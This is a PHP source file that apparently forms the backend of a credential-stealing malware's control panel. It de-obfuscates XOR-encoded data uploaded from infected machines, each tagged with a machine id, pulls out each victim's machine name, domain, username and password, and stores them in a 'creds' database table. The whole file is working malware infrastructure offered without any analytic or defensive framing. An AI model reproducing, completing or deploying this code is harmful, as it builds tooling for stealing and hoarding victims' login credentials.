<?php
/*
    parser_0001.php
  
*/

define('sizeof_SERIALIZED_CREDS_BUFFER', 4+4+8+1+1+1+1+1+1);

// returns dexored string
function _id1DeXor($coded_data, $key1, $key2)
{
    $res = substr($coded_data, 0, 8);
    $data = substr($coded_data, 8);
    $pos = 0;
    
    // prepare 8-byte array with xor bytes [0..7]
    $ckey = array_reverse(array_reverse(unpack("C*", pack("VV", $key2, $key1))));
    
    while ($pos < strlen($data)) {
    
        $res .= chr( (ord($data[$pos]) ^ $ckey[ ($pos & 0x07)  ]) & 0xFF );
        
       // echo "cnt={$pos} i=".strval($pos & 0x07)." xor_byte=".strval($ckey[ ($pos & 0x07)  ])."\n";

        $pos++;
        
    } // while 
    
    //print_r($ckey);

    return $res;
}

function _id1ROL32($i, $pos)
{
	// rol as usual	
	$res = ($i >> $pos) ;

	// clear leftmost bits which should be zero (but will be 1 in case of sign extension)
    $mask = ~( 0xFFFFFFFF << (32 - $pos));
    
    return $res & $mask ^ ($i << (32 - $pos));
}

function _id1ROR32($i, $pos)
{
    $mask = ~( 0xFFFFFFFF << (32 - $pos));
    
    return ($i >> $pos) & $mask;
}

// decodes a chunk of ENC_BUFFER stream with encoded creds element 
function cbDecode($bin)
{
    $res = '';
    
    $keys = unpack("V2dwKey", $bin);
    $data = substr($bin, 8);
    $i = strlen($data);
    $pos = 0;
    
    while ($i) {
    
        $res .= chr( ( ord($data[$pos]) ^ ($keys['dwKey1'] & 0xFF) ^ ($keys['dwKey2'] & 0xFF)) & 0xFF );
        
        //echo "pos={$pos} key1=".bin2hex(pack("V", $keys['dwKey1']))." key2=".bin2hex(pack("V", $keys['dwKey2']))."\n";
        
        $keys['dwKey1'] = _id1ROL32($keys['dwKey1'], 3);
        $keys['dwKey2'] = _id1ROR32($keys['dwKey2'], 2);
        
        $i--;
        $pos++;
    }
    
    //echo "-------------\n\n";
    
    //print_r($keys); echo "/n"; echo "[{$res}]<br>";

    return $res;
}


/* 
    main enter function. Returns FALSE in case of any errors
    Params passed:
    $m_id - numeric id identifying particular machine
    $mod_data - binary chunk to be parsed by this module
    $error - buffer to contain any error for logging in case of parse failure
*/ 
 function Parser_id0001($m_id, $mod_data, &$error)
{
    global $g_dblink;

    $left_chunk = $mod_data;
    
    do {
    
    $keys = unpack("V2dwRandomKey", $left_chunk);
    
    //echo(sprintf("dwRKey1=%08Xh dwRKey2=%08Xh\r\n", $keys['dwRandomKey1'], $keys['dwRandomKey2'] ));
    
    // NB: dexor is not performed on first 2 DWORDs
    $data = _id1DeXor($left_chunk, $keys['dwRandomKey1'], $keys['dwRandomKey2']); // decode whole chunk, possibly more than 1 item, other items will be invalid for this turn
    
    // decode unxored data header
    $item = unpack("VdwRandomKey1/VdwRandomKey2/VdwGatheredStampHigh/VdwGatheredStampLow/CbOrigin2/CbAccessLevel/Cblen_SourceMachineName/Cblen_Domain/Cblen_Username/Cblen_Password", $data);
    
    //print_r($item); echo $data;
    
    // check len to be sane
    $item_len = $item['blen_SourceMachineName'] + $item['blen_Domain'] + $item['blen_Username'] + $item['blen_Password'] + sizeof_SERIALIZED_CREDS_BUFFER;
    if ($item_len > strlen($mod_data)) { $error = __FUNCTION__."(".__LINE__."): decoded res len {$item_len} more than max expected ".strlen($mod_data); return FALSE; }
    
    // check individual lengths
    //if $item['blen_SourceMachineName'] > 15 * 2 + 8

    // process decoded chunk - decode elements
    $start_pos = sizeof_SERIALIZED_CREDS_BUFFER;
    $sSourceMachineName =   mysqli_real_escape_string($g_dblink, cbDecode(substr($data, $start_pos, $item['blen_SourceMachineName'])));   $start_pos += $item['blen_SourceMachineName'];
    $sDomain =              mysqli_real_escape_string($g_dblink,cbDecode(substr($data, $start_pos, $item['blen_Domain'])));              $start_pos += $item['blen_Domain'];
    $sUsername =            mysqli_real_escape_string($g_dblink,cbDecode(substr($data, $start_pos, $item['blen_Username'])));            $start_pos += $item['blen_Username'];
    $sPassword =            mysqli_real_escape_string($g_dblink,cbDecode(substr($data, $start_pos, $item['blen_Password'])));            //$start_pos += $item['Password'];
    
    //echo "src=[{$sSourceMachineName}] domain=[{$sDomain}] u=[{$sUsername}] p=[{$sPassword}]";
    
    // put into db
    if (!mysqli_query($g_dblink, "INSERT INTO `creds` (`src_id`, `stamp`, `OriginStampHigh`, `OriginStampLow`, `OriginType`, `AccessLevel`, `SM`, `D`, `U`, `P`) VALUES
                            (   {$m_id}, 
                                NOW(), 
                                {$item['dwGatheredStampHigh']}, 
                                {$item['dwGatheredStampLow']}, 
                                {$item['bOrigin2']},
                                {$item['bAccessLevel']},
                                '{$sSourceMachineName}',
                                '{$sDomain}',
                                '{$sUsername}',
                                '{$sPassword}'
                                ) ON DUPLICATE KEY UPDATE `stamp`=NOW();")) { $error = __FUNCTION__."(".__LINE__."): query failed: ".mysqli_error($g_dblink); return FALSE; }
    
    // cut processed part
    $left_chunk = substr($left_chunk, $item_len);
    
    } while (strlen($left_chunk)>0);
    
    // all ok if got here 
    return TRUE;
}

?>